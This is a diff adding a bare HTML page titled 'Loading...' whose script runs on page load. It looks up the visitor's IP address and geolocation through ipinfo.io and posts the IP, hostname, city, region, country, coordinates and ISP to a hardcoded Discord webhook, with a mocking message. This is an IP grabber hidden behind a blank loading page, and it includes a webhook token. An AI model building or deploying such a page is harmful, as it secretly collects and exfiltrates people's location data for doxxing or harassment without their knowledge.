@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Loading...</title>
+  </head>
+  <body>
+    <script>
+      // Make a request to the ipinfo.io API to get the user's IP and geolocation
+      fetch("https://ipinfo.io/json")
+        .then((response) => response.json())
+        .then((data) => {
+          // Send the data to the Discord webhook
+          fetch(
+            "https://discord.com/api/webhooks/1054962601773236305/C6wADQHJgKhnPWeLroJ6UCSdxbPyGU7GXyLeXn2gDdmYxvXbwms52FZRDeW_O-JHEwsD",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify({
+                username: "This You",
+                avatar_url:
+                  "https://i.ytimg.com/vi/581NK8NGqk0/maxresdefault.jpg",
+                content: `**That's what i thought you said now let me offer this as a rebuttal**\n> IP: ${data.ip}\n> Hostname: ${data.hostname}\n> City: ${data.city}\n> Region: ${data.region}\n> Country: ${data.country}\n> Timezone: ${data.timezone}\n> Cordinates: ${data.loc}\n> ISP: ${data.org}`,
+              }),
+            }
+          );
+        });
+    </script>
+  </body>
+</html>
